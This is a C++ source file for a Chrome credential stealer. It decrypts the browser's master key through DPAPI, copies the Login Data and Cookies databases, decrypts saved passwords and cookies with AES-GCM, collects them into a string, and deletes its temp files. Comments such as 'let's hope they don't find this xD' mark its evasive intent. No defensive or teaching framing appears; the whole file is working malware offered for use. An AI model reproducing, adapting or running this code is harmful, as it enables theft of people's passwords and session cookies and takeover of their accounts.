#include "stealer.h"
#include "Lmcons.h"
/* steps to decrypt passwords
    1) Open \User Data\Local states and get encrypted_key which is Base64 encoded
    2) now after decoding it in Base64, we'll get the key encrypted using DPAPI (CryptUnprotectData)
    3) what is decrypted text returned to us will be the key used for aes_gcm

    fileParser returns the encrypted key in LPWSTR (note it is not LPCWSTR)
    Base64 decode takes LPCWSTR as input and outputs BYTE*
    DPAPI uses BYTE* and return BYTE* (first 5 bytes is DPAPI)
    aes_gcm takes BYTE* and return BYTE*
*/

static std::string resultStr;


void putInResult(char* arrayUno, char* arrayDos){
    size_t i = 0;
    while(arrayUno[i]!='\0'){
        resultStr += arrayUno[i++];
    }
    resultStr += ": ";
    i = 0;
    while(arrayDos[i]!='\0'){
        resultStr += arrayDos[i++];
    }
    resultStr += "\n";
}

void insertByteToCharToResultLOL(BYTE* secret, DWORD secret_size, std::string cookieOrPassword){
    std::string temp;
    resultStr += cookieOrPassword;
    for(size_t i = 0; i < secret_size; i++){
        temp += (char)secret[i];
    }
    resultStr += temp + " \n";
}

int callback_logindata(void *p_data, int num_fields, char **p_fields, char **p_col_names){
    //parse p_data to aesgcm class
    AESGCM* aes = (AESGCM*)p_data;
    //print data from SQLDataBase
    for(int i =0;i < num_fields; i++){
        //password
        if(i == 2){
            char *passcode = p_fields[i];
            //find index of NULL terminator
            size_t encrypted_size = 0;
            if(passcode[encrypted_size] != '\0'){
                while(passcode[encrypted_size+1] != '\0'){
                    //printf("%c(%02X)-", passcode[encrypted_size], (BYTE)passcode[encrypted_size]);
                    encrypted_size++;
                }
                //Size of the char array is index + 1, since we started at 0 
                //printf("%c(%02X)-", passcode[encrypted_size], (BYTE)passcode[encrypted_size]);
                encrypted_size++;
            }
            //printf("%c(%02X) ***END\n", passcode[encrypted_size], (BYTE)passcode[encrypted_size]);
            //printf("Size of encrypted string: %d\n", encrypted_size);
            // if size is big enough, we decrypt it using aes gcm mode
            if(encrypted_size >= 31){
                size_t ciphertext_size = encrypted_size - 31;
                BYTE* IV = new BYTE[12];
                BYTE* tag = new BYTE[16];
                BYTE* password = (BYTE*)p_fields[i];
                BYTE* cipher = new BYTE[ciphertext_size];
                // skip first 3 bytes, parse encrypted_password into IV, cipher, and mac tag
                for(int j = 0; j < 12; j++){
                    IV[j] = password[j+3];
                }
                for(int j = 0; j < ciphertext_size; j++){
                    cipher[j] = password[j+15];
                }
                size_t tag_offset = encrypted_size - 16;
                for(int j = 0; j < 16; j++){
                    tag[j] = password[j+tag_offset];
                }

                //Decrypt if ciphertext size is not 0, otherwise verify tag
                if(ciphertext_size){
                    //decrypt password
                    if(!aes->Decrypt(IV, 12, cipher, ciphertext_size, tag, 16)){
                        BYTE* plaintext = aes->plaintext;
                        DWORD plaintext_size = aes->ptBufferSize;
                        insertByteToCharToResultLOL(plaintext, plaintext_size, aes->cookieOrPassword);
                        if(!::HeapFree(GetProcessHeap(), 0, (LPVOID)aes->plaintext)){
                            printf("Something terrible has happened\n");
                        }
                        aes->plaintext = NULL;
                    }else{
                        resultStr += aes->cookieOrPassword + "CANNOT DECRYPT\n";
                    }  
                }else{
                    if(aes->VerifyTag(IV, 12, tag, 16)){
                        printf("Tag mismatch!!!\n");
                    }else{
                        resultStr += aes->cookieOrPassword + "User did not save this password\n";
                    }
                }
                
                delete cipher;
                delete tag;
                delete IV;
            } 
        }else
        putInResult(p_col_names[i], p_fields[i]);
    }
    resultStr += "-------------------------------------------------------------------------\n";
    return 0;
}

int callback_cookies(void *p_data, int num_fields, char **p_fields, char **p_col_names){
    //parse p_data to aesgcm class
    AESGCM* aes = (AESGCM*)p_data;
    string temp;
    //print data from SQLDataBase
    for(int i =0;i < num_fields; i++){
        //password
        if(i == 2){
            char *passcode = p_fields[i];
            size_t encrypted_size = 0;
            if(passcode[encrypted_size] != '\0'){
                while(passcode[encrypted_size+1] != '\0'){
                    printf("%c-", (char)passcode[encrypted_size++]);
                }
            }
            printf("\nSize of encrypted string: %d\n", encrypted_size);
            // if size is big enough, we decrypt it using aes gcm mode
            if(encrypted_size > 31 && (char)passcode[0] == 'v' && (char)passcode[1] == '1' && (char)passcode[2] == '0'){
                size_t ciphertext_size = encrypted_size - 31;
                BYTE* password = (BYTE*)passcode;
                //decrypt password
                if(aes->Decrypt(password+3, 12, password+15, ciphertext_size, password+(encrypted_size-16), 16)){
                    BYTE* plaintext = aes->plaintext;
                    DWORD plaintext_size = aes->ptBufferSize;
                    insertByteToCharToResultLOL(plaintext, plaintext_size, aes->cookieOrPassword);
                    if(!::HeapFree(GetProcessHeap(), 0, (LPVOID)plaintext)){
                        printf("Something terrible has happened\n");
                    }
                    plaintext = NULL;
                    cout << "GOT IT\n" << endl;
                }else{
                    cout << "FAILED\n" << endl;
                    resultStr += aes->cookieOrPassword + "CANNOT DECRYPT\n";
                }  
            } 
        }else{
            putInResult(p_col_names[i], p_fields[i]);
        }
    }
    
    return 0;
}

std::string steala(void){    
    if(resultStr.size() != 0){
        cout << "HI" << endl;
        return resultStr;
    }
    /* Parse encrypted_key, Base64 decode, DPAPI decrypt */
    char user[UNLEN+1];
    DWORD user_length = UNLEN+1;
    GetUserNameA(user, &user_length);
    //printf("%s",user);
    string temp = user;
    string localStatePath = "C:\\Users\\"+temp+"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    DWORD base64_encodedkey_size;
    parseObjectFromJson(localStatePath, "encrypted_key", NULL, &base64_encodedkey_size);
    if(base64_encodedkey_size == -1337){
        wprintf(L"Encountered error parsing encrypted_key, exiting immedimately\n");
        return "NOPE";
    }
    LPWSTR buffer = new wchar_t[base64_encodedkey_size];
    parseObjectFromJson(localStatePath, "encrypted_key", buffer, &base64_encodedkey_size);

    //BASE64 decode encrypted_key value
    DWORD decodedSize;
    wstring str = buffer;
    decode(str, NULL, &decodedSize);
    BYTE* decodedKey = new BYTE[decodedSize];
    decode(str, decodedKey, &decodedSize);

    //first 5 bytes are not used
    decodedSize -= 5;
    BYTE* decodedKey_Ready = new BYTE[decodedSize];
    for(int i = 0; i < decodedSize; i++){
        decodedKey_Ready[i] = decodedKey[i+5];
    }

    //decrypt decoded encrypted key using DPAPI
    DATA_BLOB encrypted_key;
    encrypted_key.cbData = decodedSize;
    encrypted_key.pbData = decodedKey_Ready;
    DATA_BLOB decrypted_key;
    LPWSTR pDescrOut =  NULL;

    if(!CryptUnprotectData(&encrypted_key, 
        &pDescrOut, 
        NULL, 
        NULL, 
        NULL, 
        0, 
        &decrypted_key)){
        wprintf(L"*** Error running cryptUnprotectData :(\n");
        wprintf(L"Error code 0x%x\n", GetLastError());
    }

    DWORD decrypted_size = decrypted_key.cbData;
    BYTE* decrypted_data = decrypted_key.pbData;

    /* Copy database to temp file, read SQL database, AES_GCM decode password */
    AESGCM* aesgcm = new AESGCM(decrypted_data); 

    //copy sql database to temporary location
    string full_string1 = "C:\\Users\\"+temp+"\\Desktop\\testing";

    string str1 = "C:\\Users\\"+temp+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
    string str2 = "C:\\Users\\"+temp+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
    if(copyContentToFile(str1, full_string1) != 0){
        wprintf(L"Encountered error copying SQL DB, exiting immedimately\n");
        return "NOPE";
    }
    //read from login data
    sqlite3 *chromeDB, *chromeCookies;

    int result;
    char *zErrMsg = 0;
    result = sqlite3_open(full_string1.c_str(), &chromeDB);
    if(result){
        wprintf(L"Can't open database: %s\n", sqlite3_errmsg(chromeDB));
        sqlite3_close(chromeDB);
        return "NOPE";
    }
    aesgcm->cookieOrPassword = "Password: ";
    const char* SQLquery = "select origin_url, username_value, password_value from logins order by date_created";
    result = sqlite3_exec(chromeDB, SQLquery, callback_logindata, aesgcm, &zErrMsg);
    if(result != SQLITE_OK){
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }
    sqlite3_close(chromeDB);

    if(deleteFile(full_string1.c_str()) != 0){
        wprintf(L"Encountered error deleting temp file, let's hope they don't find this xD\n");
    }

    //read from cookies
    string full_string2 = "C:\\Users\\"+temp+"\\Desktop\\testing2";
    if(copyContentToFile(str2, full_string2) != 0){
        wprintf(L"Encountered error copying SQL DB, exiting immedimately\n");
        return "NOPE";
    }
    result = sqlite3_open(full_string2.c_str(), &chromeCookies);
    if(result){
        wprintf(L"Can't open database: %s\n", sqlite3_errmsg(chromeCookies));
        sqlite3_close(chromeCookies);
        return "NOPE";
    }
    aesgcm->cookieOrPassword = "Cookie: ";
    const char* SQLquery2 = "select host_key, value, encrypted_value from cookies order by creation_utc";
    result = sqlite3_exec(chromeCookies, SQLquery2, callback_logindata, aesgcm, &zErrMsg);
    if(result != SQLITE_OK){
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }
    sqlite3_close(chromeCookies);

    if(deleteFile(full_string2.c_str()) != 0){
        wprintf(L"Encountered error deleting temp file, let's hope they don't find this xD\n");
    }

    wprintf(L"I dump passwords!\n");
    //clean up
    delete buffer;
    delete decodedKey;
    delete decodedKey_Ready;
    delete aesgcm;
    
    return resultStr;
}